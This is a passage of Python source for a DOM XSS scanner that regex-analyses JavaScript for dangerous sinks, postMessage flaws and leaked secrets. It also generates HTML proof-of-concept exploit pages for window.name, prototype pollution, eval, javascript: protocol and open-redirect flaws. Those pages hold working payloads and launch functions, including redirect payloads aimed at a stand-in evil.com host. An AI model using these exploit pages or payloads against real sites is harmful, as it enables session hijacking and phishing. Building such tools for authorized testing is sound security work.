                <li>This page sets <code>window.name</code> to the XSS payload</li>
                <li>Then navigates to the vulnerable target page</li>
                <li>The target page reads <code>window.name</code> and injects it into the DOM</li>
                <li>The XSS payload executes in the target's origin</li>
            </ol>
        </div>

        <h3>Select Payload:</h3>
        <ul id="payloadList" style="list-style:none; padding:0;"></ul>

        <button onclick="launchExploit(0)">🚀 Launch Exploit (Payload #1)</button>
        <button onclick="customPayload()">🔧 Custom Payload</button>
    </div>

    <script>
        const targetUrl = "{target_url}";
        const payloads = {payloads_js};

        function init() {{
            const list = document.getElementById('payloadList');
            payloads.forEach((p, i) => {{
                const li = document.createElement('li');
                li.style.cssText = 'background:#0d1117; margin:5px 0; padding:10px; border-radius:5px; cursor:pointer; border:1px solid #30363d;';
                li.textContent = `Payload #${{i+1}}: ${{p}}`;
                li.onclick = () => launchExploit(i);
                list.appendChild(li);
            }});
        }}

        function launchExploit(index) {{
            const payload = payloads[index];
            // Set window.name and navigate to target
            const w = window.open('', payload);
            w.location = targetUrl;
        }}

        function customPayload() {{
            const payload = prompt('Enter custom window.name payload:', '<img src=x onerror=alert(document.domain)>');
            if (payload) {{
                const w = window.open('', payload);
                w.location = targetUrl;
            }}
        }}

        init();
    </script>
</body>
</html>"""

    @staticmethod
    def generate_prototype_pollution_poc(target_url: str, finding: VulnFinding) -> str:
        payloads_js = json.dumps(PoCGenerator.PAYLOADS["prototype_pollution"])
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Prototype Pollution PoC - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 150px; color: #e94560; }}
        #result {{ margin-top: 20px; padding: 15px; border-radius: 8px; display: none; background: #16213e; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 Prototype Pollution PoC</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td>{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
            </table>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Test URLs:</h3>
        <div id="urlList"></div>

        <button onclick="testAll()">🚀 Test All Payloads</button>
        <button onclick="testCustom()">🔧 Custom Payload</button>

        <div id="result"></div>
    </div>

    <script>
        const targetUrl = "{target_url}";
        const payloads = {payloads_js};

        function init() {{
            const div = document.getElementById('urlList');
            payloads.forEach((p, i) => {{
                const testUrl = targetUrl + p;
                const d = document.createElement('div');
                d.className = 'code';
                d.style.cursor = 'pointer';
                d.textContent = testUrl;
                d.onclick = () => window.open(testUrl, '_blank');
                div.appendChild(d);
            }});
        }}

        function testAll() {{
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.innerHTML = '<h3>Testing...</h3><p>Open browser DevTools console on the target page and check if Object.prototype has been polluted:</p>' +
                '<div class="code">// Run in console on target page:\\n' +
                'console.log(({{}}).__proto__);\\n' +
                'console.log(({{}}).polluted);\\n' +
                'console.log(({{}}).innerHTML);</div>';
            payloads.forEach((p, i) => {{
                setTimeout(() => window.open(targetUrl + p, '_blank'), i * 500);
            }});
        }}

        function testCustom() {{
            const payload = prompt('Enter prototype pollution payload:', '?__proto__[test]=polluted');
            if (payload) {{
                window.open(targetUrl + payload, '_blank');
            }}
        }}

        init();
    </script>
</body>
</html>"""

    @staticmethod
    def generate_eval_injection_poc(target_url: str, finding: VulnFinding) -> str:
        payloads_js = json.dumps(PoCGenerator.PAYLOADS["eval_injection"])
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS PoC - eval() Injection - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 150px; color: #e94560; }}
        #result {{ margin-top: 20px; padding: 15px; border-radius: 8px; display: none; background: #16213e; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 DOM XSS PoC - eval() / Function() Injection</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td class="severity-critical">{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
            </table>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Test Payloads:</h3>
        <div id="urlList"></div>

        <button onclick="testAll()">🚀 Test All Payloads</button>
        <button onclick="testCustom()">🔧 Custom Payload</button>
        <button onclick="copyReport()">📋 Copy Report</button>

        <div id="result"></div>
    </div>

    <script>
        const targetUrl = "{target_url}";
        const payloads = {payloads_js};

        function init() {{
            const div = document.getElementById('urlList');
            payloads.forEach((p, i) => {{
                const testUrl = targetUrl + '?callback=' + encodeURIComponent(p);
                const hashUrl = targetUrl + '#' + encodeURIComponent(p);
                const d = document.createElement('div');
                d.className = 'code';
                d.style.cursor = 'pointer';
                d.innerHTML = `<strong>Payload #${{i+1}}:</strong> ${{p}}<br>Query: ${{testUrl}}<br>Hash: ${{hashUrl}}`;
                div.appendChild(d);
            }});
        }}

        function testAll() {{
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            let html = '<h3>Test URLs Generated:</h3>';
            payloads.forEach((p, i) => {{
                const qUrl = targetUrl + '?callback=' + encodeURIComponent(p);
                const hUrl = targetUrl + '#' + encodeURIComponent(p);
                html += `<p><strong>#${{i+1}} (query):</strong></p><div class="code">${{qUrl}}</div>`;
                html += `<p><strong>#${{i+1}} (hash):</strong></p><div class="code">${{hUrl}}</div>`;
            }});
            html += '<p>Open each URL in a new tab and check for JavaScript execution.</p>';
            resultDiv.innerHTML = html;
        }}

        function testCustom() {{
            const payload = prompt('Enter eval injection payload:', 'alert(document.domain)');
            if (payload) {{
                const qUrl = targetUrl + '?callback=' + encodeURIComponent(payload);
                const hUrl = targetUrl + '#' + encodeURIComponent(payload);
                window.open(qUrl, '_blank');
                setTimeout(() => window.open(hUrl, '_blank'), 500);
            }}
        }}

        function copyReport() {{
            const report = `DOM XSS via eval()/Function() - Vulnerability Report
=====================================================
Target: ${{targetUrl}}
Type: {finding.vuln_type}
Severity: {finding.severity.upper()}
CWE: {finding.cwe_id}
File: {finding.js_file}
Line: {finding.line_number}
Description: {finding.description}
Remediation: {finding.remediation}

Vulnerable Code:
{finding.code_snippet}
`;
            navigator.clipboard.writeText(report).then(() => alert('Report copied!'));
        }}

        init();
    </script>
</body>
</html>"""

    @staticmethod
    def generate_open_redirect_poc(target_url: str, finding: VulnFinding) -> str:
        redirect_payloads = [
            '?next=https://evil.com',
            '?url=https://evil.com',
            '?redirect=https://evil.com',
            '?return=https://evil.com',
            '?rurl=//evil.com',
            '?dest=javascript:alert(document.domain)',
            '#//evil.com',
            '?goto=https://evil.com',
        ]
        payloads_js = json.dumps(redirect_payloads)
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Open Redirect PoC - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 900px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 150px; color: #e94560; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🟠 Open Redirect PoC</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td>{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
            </table>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Test URLs (replace evil.com with your Burp Collaborator / webhook):</h3>
        <div id="urlList"></div>

        <button onclick="testCustom()">🔧 Custom Redirect Target</button>
        <button onclick="copyReport()">📋 Copy Report</button>
    </div>

    <script>
        const targetUrl = "{target_url}";
        const payloads = {payloads_js};

        function init() {{
            const div = document.getElementById('urlList');
            payloads.forEach((p, i) => {{
                const testUrl = targetUrl + p;
                const d = document.createElement('div');
                d.className = 'code';
                d.style.cursor = 'pointer';
                d.textContent = testUrl;
                d.onclick = () => window.open(testUrl, '_blank');
                div.appendChild(d);
            }});
        }}

        function testCustom() {{
            const target = prompt('Enter redirect target URL:', 'https://your-collaborator.burpcollaborator.net');
            if (target) {{
                const params = ['next', 'url', 'redirect', 'return', 'rurl', 'dest', 'goto'];
                params.forEach(p => {{
                    const testUrl = `${{targetUrl}}?${{p}}=${{encodeURIComponent(target)}}`;
                    const d = document.createElement('div');
                    d.className = 'code';
                    d.style.cursor = 'pointer';
                    d.textContent = testUrl;
                    d.onclick = () => window.open(testUrl, '_blank');
                    document.getElementById('urlList').appendChild(d);
                }});
            }}
        }}

        function copyReport() {{
            const report = `Open Redirect Vulnerability Report
=====================================
Target: ${{targetUrl}}
Type: {finding.vuln_type}
Severity: {finding.severity.upper()}
CWE: {finding.cwe_id}
File: {finding.js_file}
Line: {finding.line_number}
Description: {finding.description}
Remediation: {finding.remediation}

Vulnerable Code:
{finding.code_snippet}

Test URLs:
${{payloads.map((p,i) => `${{i+1}}. ${{targetUrl}}${{p}}`).join('\\n')}}
`;
            navigator.clipboard.writeText(report).then(() => alert('Report copied!'));
        }}

        init();
    </script>
</body>
</html>"""

    @classmethod
    def generate_poc(cls, target_url: str, finding: VulnFinding) -> str:
        """Route to appropriate PoC generator based on vulnerability type."""
        vuln_type = finding.vuln_type.lower()

        if "javascript_protocol" in vuln_type or "javascript:" in finding.context.lower():
            return cls.generate_javascript_protocol_poc(target_url, finding)
        elif "srcdoc" in vuln_type:
            return cls.generate_javascript_protocol_poc(target_url, finding)
        elif "postmessage" in vuln_type or "postmessage" in finding.context.lower():
            return cls.generate_postmessage_poc(target_url, finding)
        elif "eval" in vuln_type or "js_execution" in vuln_type:
            return cls.generate_eval_injection_poc(target_url, finding)
        elif "window.name" in finding.source.lower() or "window_name" in vuln_type:
            return cls.generate_window_name_poc(target_url, finding)
        elif "prototype" in vuln_type:
            return cls.generate_prototype_pollution_poc(target_url, finding)
        elif "redirect" in vuln_type:
            return cls.generate_open_redirect_poc(target_url, finding)
        else:
            return cls.generate_location_hash_poc(target_url, finding)

    @staticmethod
    def generate_javascript_protocol_poc(target_url: str, finding: VulnFinding) -> str:
        """Generate PoC for javascript: protocol injection via URL parameters."""
        payloads_js = json.dumps(PoCGenerator.PAYLOADS["javascript_protocol"])
        # Try to detect the parameter name from the finding context
        param_name = "loginUrl"
        param_match = re.search(
            r"(?:loginUrl|login_url|redirectUrl|redirect_url|returnUrl|return_url|"
            r"callbackUrl|callback_url|next|nextUrl|goto|redirect|redir|url|link|"
            r"target|dest|destination|forward|fwd|return|continue|continueTo|rurl)",
            finding.context, re.IGNORECASE
        )
        if param_match:
            param_name = param_match.group()

        return f"""<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS PoC - javascript: Protocol Injection - {target_url}</title>
    <style>
        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 20px; background: #1a1a2e; color: #e0e0e0; }}
        .container {{ max-width: 1000px; margin: 0 auto; }}
        h1 {{ color: #e94560; border-bottom: 2px solid #e94560; padding-bottom: 10px; }}
        .info-box {{ background: #16213e; border: 1px solid #0f3460; border-radius: 8px; padding: 15px; margin: 15px 0; }}
        .warning {{ background: #3d1f00; border-color: #ff6600; color: #ffcc00; }}
        .code {{ background: #0d1117; padding: 12px; border-radius: 5px; font-family: 'Courier New', monospace; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin: 10px 0; font-size: 13px; }}
        button {{ background: #e94560; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 5px; font-size: 14px; }}
        button:hover {{ background: #c73e54; }}
        .payload-list {{ list-style: none; padding: 0; }}
        .payload-list li {{ background: #0d1117; margin: 5px 0; padding: 10px; border-radius: 5px; cursor: pointer; border: 1px solid #30363d; word-break: break-all; }}
        .payload-list li:hover {{ border-color: #e94560; }}
        #result {{ margin-top: 20px; padding: 15px; border-radius: 8px; display: none; }}
        .severity-critical {{ color: #ff0000; font-weight: bold; }}
        .severity-high {{ color: #ff6600; font-weight: bold; }}
        table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
        td {{ padding: 8px; border: 1px solid #30363d; }}
        td:first-child {{ font-weight: bold; width: 180px; color: #e94560; }}
        input[type="text"] {{ width: 100%; padding: 10px; background: #0d1117; color: #e0e0e0; border: 1px solid #30363d; border-radius: 5px; font-family: monospace; font-size: 13px; }}
        .success {{ background: #1a3d1a; border-color: #00ff00; color: #00ff00; }}
        .fail {{ background: #3d1a1a; border-color: #ff0000; color: #ff6666; }}
    </style>
</head>
<body>
    <div class="container">
        <h1>🔴 DOM XSS PoC - javascript: Protocol Injection</h1>

        <div class="info-box warning">
            <strong>⚠️ DISCLAIMER:</strong> This PoC is for authorized security testing only.
            Unauthorized use is illegal and unethical.
        </div>

        <div class="info-box">
            <table>
                <tr><td>Target URL</td><td>{target_url}</td></tr>
                <tr><td>Vulnerability</td><td>{finding.vuln_type}</td></tr>
                <tr><td>Severity</td><td class="severity-{finding.severity}">{finding.severity.upper()}</td></tr>
                <tr><td>CWE</td><td>{finding.cwe_id}</td></tr>
                <tr><td>Source File</td><td>{finding.js_file}</td></tr>
                <tr><td>Line</td><td>{finding.line_number}</td></tr>
                <tr><td>Vulnerable Param</td><td><strong>{param_name}</strong></td></tr>
                <tr><td>Attack Vector</td><td>javascript: protocol in URL parameter value</td></tr>
            </table>
        </div>

        <h3>Attack Description:</h3>
        <div class="info-box">
            <p>The application reads the <code>{param_name}</code> URL parameter and uses its value as a navigation target
            (e.g., <code>location.href = params.get('{param_name}')</code> or <code>element.href = ...</code>).</p>
            <p>Since there is no validation to block <code>javascript:</code> protocol, an attacker can inject arbitrary JavaScript.</p>
            <p><strong>Example:</strong></p>
            <div class="code">{target_url}?{param_name}=javascript:alert(document.domain)</div>
        </div>

        <h3>Vulnerable Code Snippet:</h3>
        <div class="code">{finding.code_snippet}</div>

        <h3>Custom Parameter Name:</h3>
        <input type="text" id="paramInput" value="{param_name}" placeholder="Parameter name (e.g., loginUrl, redirect)">

        <h3>Test Payloads (click to open):</h3>
        <ul class="payload-list" id="payloadList"></ul>

        <button onclick="testAllPayloads()">🚀 Generate All Test URLs</button>
        <button onclick="openManualTest()">🔧 Custom Payload</button>
        <button onclick="copyReport()">📋 Copy Report</button>
        <button onclick="copyAllUrls()">📋 Copy All URLs</button>

        <div id="result"></div>
    </div>

    <script>
        const baseUrl = "{target_url}";
        const payloads = {payloads_js};
        let defaultParam = "{param_name}";

        function getParam() {{
            return document.getElementById('paramInput').value.trim() || defaultParam;
        }}

        function buildTestUrl(payload) {{
            const param = getParam();
            const url = new URL(baseUrl);
            url.searchParams.set(param, payload);
            return url.toString();
        }}

        function init() {{
            const list = document.getElementById('payloadList');
            payloads.forEach((p, i) => {{
                const li = document.createElement('li');
                const testUrl = buildTestUrl(p);
                li.innerHTML = `<strong>#${{i+1}}</strong>: <code>${{p}}</code><br><small>${{testUrl}}</small>`;
                li.onclick = () => {{
                    const url = buildTestUrl(p);
                    window.open(url, '_blank');
                }};
                list.appendChild(li);
            }});
        }}

        function testAllPayloads() {{
            const resultDiv = document.getElementById('result');
            resultDiv.style.display = 'block';
            resultDiv.style.background = '#16213e';
            const param = getParam();
            let html = `<h3>All Test URLs for parameter: ${{param}}</h3>`;
            html += '<p>Click any URL to test, or copy all:</p>';
            payloads.forEach((p, i) => {{
                const testUrl = buildTestUrl(p);
                html += `<div class="code" style="cursor:pointer" onclick="window.open('${{testUrl.replace(/'/g, "\\\\'")}}', '_blank')"><strong>#${{i+1}}:</strong> ${{testUrl}}</div>`;
            }});
            html += '<p><strong>Instructions:</strong> Open each URL. If you see an alert popup or JavaScript executes, the parameter is vulnerable to javascript: protocol injection.</p>';
            resultDiv.innerHTML = html;
        }}

        function openManualTest() {{
            const payload = prompt(
                'Enter custom javascript: payload:',
                'javascript:document.body.appendChild(document.createElement("iframe")).srcdoc=\\'<script>alert(1337)<\\\\/script>\\''
            );
            if (payload) {{
                const url = buildTestUrl(payload);
                console.log('Testing URL:', url);
                window.open(url, '_blank');
            }}
        }}

        function copyAllUrls() {{
            const param = getParam();
            const urls = payloads.map((p, i) => `${{i+1}}. ${{buildTestUrl(p)}}`).join('\\n');
            navigator.clipboard.writeText(urls).then(() => {{
                alert('All test URLs copied to clipboard!');
            }});
        }}

        function copyReport() {{
            const param = getParam();
            const report = `DOM XSS via javascript: Protocol Injection
=============================================
Target: ${{baseUrl}}
Vulnerable Parameter: ${{param}}
Type: {finding.vuln_type}
Severity: {finding.severity.upper()}
CWE: {finding.cwe_id}
File: {finding.js_file}
Line: {finding.line_number}
Description: {finding.description}
Remediation: {finding.remediation}

Attack Vector:
The application reads the "${{param}}" URL parameter and uses its value
as a navigation target without filtering the javascript: protocol.

Proof of Concept:
${{baseUrl}}?${{param}}=javascript:alert(document.domain)

All Test Payloads:
${{payloads.map((p,i) => `${{i+1}}. ${{buildTestUrl(p)}}`).join('\\n')}}

Vulnerable Code:
{finding.code_snippet}

Impact:
- Full XSS in the context of the application's origin
- Session hijacking via cookie theft
- Phishing via page content manipulation
- Keylogging and credential theft
`;
            navigator.clipboard.writeText(report).then(() => {{
                alert('Report copied to clipboard!');
            }});
        }}

        init();
    </script>
</body>
</html>"""


# ─────────────────────────────────────────────
# JavaScript Analyzer Engine
# ─────────────────────────────────────────────

class JSAnalyzer:
    """Deep analysis engine for JavaScript code."""

    def __init__(self, beautify: bool = True):
        self.beautify = beautify
        self.logger = logging.getLogger("JSAnalyzer")

    def preprocess(self, code: str) -> str:
        """Beautify and normalize JavaScript code."""
        if self.beautify:
            try:
                opts = jsbeautifier.default_options()
                opts.indent_size = 2
                opts.max_preserve_newlines = 2
                code = jsbeautifier.beautify(code, opts)
            except Exception as e:
                self.logger.debug(f"Beautification failed: {e}")
        return code

    def get_line_number(self, code: str, match_start: int) -> int:
        """Get line number from character offset."""
        return code[:match_start].count('\n') + 1

    def get_code_snippet(self, code: str, match_start: int, context_lines: int = 3) -> str:
        """Extract code snippet around a match."""
        lines = code.split('\n')
        line_num = self.get_line_number(code, match_start)
        start = max(0, line_num - context_lines - 1)
        end = min(len(lines), line_num + context_lines)
        snippet_lines = []
        for i in range(start, end):
            marker = ">>>" if i == line_num - 1 else "   "
            snippet_lines.append(f"{marker} {i+1:4d} | {lines[i]}")
        return '\n'.join(snippet_lines)

    def get_context(self, code: str, match_start: int, window: int = 500) -> str:
        """Get surrounding context of a match."""
        start = max(0, match_start - window)
        end = min(len(code), match_start + window)
        context = code[start:end]
        if start > 0:
            context = "..." + context
        if end < len(code):
            context = context + "..."
        return context

    def trace_source_to_sink(self, code: str, sink_match,sink_pattern_name: str) -> List[Dict]:
        """Trace data flow from sources to sinks within a code block."""
        traces = []
        sink_line = self.get_line_number(code, sink_match.start())
        context = self.get_context(code, sink_match.start(), window=2000)

        for source_category, source_patterns in VulnPatterns.SOURCES.items():
            for source_pattern in source_patterns:
                source_matches = list(re.finditer(source_pattern, context, re.IGNORECASE))
                if source_matches:
                    for sm in source_matches:
                        traces.append({
                            "source_category": source_category,
                            "source_pattern": source_pattern,
                            "source_match": sm.group(),
                            "sink_pattern": sink_pattern_name,
                            "sink_match": sink_match.group(),
                            "sink_line": sink_line,
                            "confidence": self._calculate_confidence(
                                source_category, sink_pattern_name, context, sm, sink_match
                            ),
                        })
        return traces

    def _calculate_confidence(self, source_cat: str, sink_cat: str,
                              context: str, source_match, sink_match) -> str:
        """Calculate confidence level of source-to-sink flow."""
        score = 0

        # Direct flow indicators
        direct_flow_patterns = [
            r"=\s*" + re.escape(source_match.group()),
            re.escape(source_match.group()) + r"\s*[;,\)]",
        ]
        for pat in direct_flow_patterns:
            if re.search(pat, context):
                score += 30

        # Variable assignment tracing (simplified)
        # Check if source is assigned to a variable that's used near the sink
        var_assign = re.findall(
            r"(?:var|let|const)\s+(\w+)\s*=\s*" + re.escape(source_match.group()),
            context
        )
        for var_name in var_assign:
            if var_name in context[sink_match.start() - 200:sink_match.end() + 50]:
                score += 40

        # Proximity scoring
        distance = abs(sink_match.start() - source_match.start())
        if distance < 100:
            score += 30
        elif distance < 300:
            score += 20
        elif distance < 800:
            score += 10

        # High-risk source-sink combinations
        high_risk_combos = {
            ("location", "xss_injection"),
            ("location", "js_execution"),
            ("communication", "xss_injection"),
            ("communication", "js_execution"),
            ("url_params", "xss_injection"),
            ("url_params", "js_execution"),
            ("storage", "xss_injection"),
        }
        if (source_cat, sink_cat) in high_risk_combos:
            score += 25

        # Sanitization detection (reduces confidence)
        sanitization_patterns = [
            r"DOMPurify\.sanitize",
            r"sanitize\s*\(",
            r"escapeHtml\s*\(",
            r"escape\s*\(",
            r"encodeURIComponent\s*\(",
            r"encodeURI\s*\(",
            r"htmlEncode\s*\(",
            r"textContent\s*=",
            r"innerText\s*=",
            r"parseInt\s*\(",
            r"parseFloat\s*\(",
            r"Number\s*\(",
            r"\.replace\s*\(\s*[/'\"].*?<.*?[/'\"]",
        ]
        for sp in sanitization_patterns:
            if re.search(sp, context):
                score -= 20

        # Origin validation detection (for postMessage)
        if source_cat == "communication":
            origin_checks = [
                r"\.origin\s*[!=]==?\s*['\"`]",
                r"event\.origin",
                r"e\.origin",
                r"\.origin\.indexOf\s*\(",
                r"\.origin\.match\s*\(",
                r"allowedOrigins",
                r"trustedOrigins",
                r"whitelistedOrigins",
            ]
            has_origin_check = any(re.search(op, context) for op in origin_checks)
            if has_origin_check:
                score -= 30

        if score >= 60:
            return "high"
        elif score >= 35:
            return "medium"
        elif score >= 15:
            return "low"
        else:
            return "info"

    def analyze_sinks(self, code: str, js_file: str) -> List[VulnFinding]:
        """Analyze code for dangerous sink patterns."""
        findings = []
        processed_code = self.preprocess(code)

        for sink_name, sink_info in VulnPatterns.SINKS.items():
            for pattern in sink_info["patterns"]:
                try:
                    matches = list(re.finditer(pattern, processed_code, re.IGNORECASE))
                    for match in matches:
                        line_num = self.get_line_number(processed_code, match.start())
                        snippet = self.get_code_snippet(processed_code, match.start())
                        context = self.get_context(processed_code, match.start())

                        # Trace source-to-sink flows
                        traces = self.trace_source_to_sink(
                            processed_code, match, sink_name
                        )

                        # Determine effective severity based on traces
                        if traces:
                            best_confidence = max(t["confidence"] for t in traces)
                            if best_confidence == "high":
                                severity = sink_info["severity"]
                            elif best_confidence == "medium":
                                severity = self._downgrade_severity(sink_info["severity"])
                            else:
                                severity = self._downgrade_severity(
                                    self._downgrade_severity(sink_info["severity"])
                                )
                            source_desc = ", ".join(set(
                                f"{t['source_category']}:{t['source_match']}" for t in traces
                            ))
                        else:
                            severity = self._downgrade_severity(
                                self._downgrade_severity(sink_info["severity"])
                            )
                            source_desc = "No direct source identified (manual review needed)"

                        finding = VulnFinding(
                            vuln_type=sink_name,
                            severity=severity,
                            source=source_desc,
                            js_file=js_file,
                            line_number=line_num,
                            code_snippet=snippet,
                            context=context[:1000],
                            description=sink_info["description"],
                            cwe_id=sink_info.get("cwe", ""),
                            remediation=sink_info.get("remediation", ""),
                        )
                        findings.append(finding)
                except re.error as e:
                    self.logger.debug(f"Regex error for pattern '{pattern}': {e}")

        return findings

    def analyze_postmessage(self, code: str, js_file: str) -> List[VulnFinding]:
        """Deep analysis of postMessage handlers."""
        findings = []
        processed_code = self.preprocess(code)

        for vuln_name, vuln_info in VulnPatterns.POSTMESSAGE_INSECURE.items():
            try:
                matches = list(re.finditer(
                    vuln_info["pattern"], processed_code,
                    re.IGNORECASE | re.DOTALL
                ))
                for match in matches:
                    line_num = self.get_line_number(processed_code, match.start())
                    snippet = self.get_code_snippet(processed_code, match.start(), context_lines=5)
                    context = self.get_context(processed_code, match.start(), window=1000)

                    finding = VulnFinding(
                        vuln_type=f"postmessage_{vuln_name}",
                        severity=vuln_info["severity"],
                        source="postMessage event.data",
                        js_file=js_file,
                        line_number=line_num,
                        code_snippet=snippet,
                        context=context[:1000],
                        description=vuln_info["description"],
                        cwe_id="CWE-345",
                        remediation="Validate event.origin against allowlist. Sanitize event.data before use.",
                    )
                    findings.append(finding)
            except re.error as e:
                self.logger.debug(f"Regex error for postMessage pattern '{vuln_name}': {e}")

        return findings

    def analyze_sensitive_data(self, code: str, js_file: str) -> List[VulnFinding]:
        """Scan for sensitive data exposure."""
        findings = []

        for category, cat_info in VulnPatterns.SENSITIVE_DATA.items():
            for pattern in cat_info["patterns"]:
                try:
                    matches = list(re.finditer(pattern, code, re.IGNORECASE))
                    for match in matches:
                        line_num = self.get_line_number(code, match.start())
                        snippet = self.get_code_snippet(code, match.start())

                        # Mask the actual secret value
                        matched_text = match.group()
                        if match.groups():
                            secret_value = match.group(1)
                            masked = secret_value[:4] + "*" * (len(secret_value) - 8) + secret_value[-4:]
                            matched_text = matched_text.replace(secret_value, masked)

                        finding = VulnFinding(
                            vuln_type=f"sensitive_data_{category}",
                            severity=cat_info["severity"],
                            source=matched_text,
                            js_file=js_file,
                            line_number=line_num,
                            code_snippet=snippet,
                            context=f"Sensitive data pattern: {category}",
                            description=cat_info["description"],
                            cwe_id=cat_info.get("cwe", ""),
                            remediation="Remove sensitive data from client-side code. Use environment variables server-side.",
                        )
                        findings.append(finding)
                except re.error as e:
                    self.logger.debug(f"Regex error for sensitive data pattern: {e}")

        return findings

    def analyze_framework_specific(self, code: str, js_file: str) -> List[VulnFinding]:
        """Analyze framework-specific vulnerability patterns."""
        findings = []

        # Angular patterns
        for vuln_name, vuln_info in VulnPatterns.ANGULAR_PATTERNS.items():
            for pattern in vuln_info["patterns"]:
                try:
                    matches = list(re.finditer(pattern, code, re.IGNORECASE))
                    for match in matches:
                        line_num = self.get_line_number(code, match.start())
                        snippet = self.get_code_snippet(code, match.start())
                        context = self.get_context(code, match.start())

                        finding = VulnFinding(
                            vuln_type=f"angular_{vuln_name}",
                            severity=vuln_info["severity"],
                            source=match.group(),
                            js_file=js_file,
                            line_number=line_num,
                            code_snippet=snippet,
                            context=context[:1000],
                            description=vuln_info["description"],
                            cwe_id=vuln_info.get("cwe", ""),
                            remediation=vuln_info.get("remediation", ""),
                        )
                        findings.append(finding)
                except re.error:
                    pass

        # React patterns
        for vuln_name, vuln_info in VulnPatterns.REACT_PATTERNS.items():
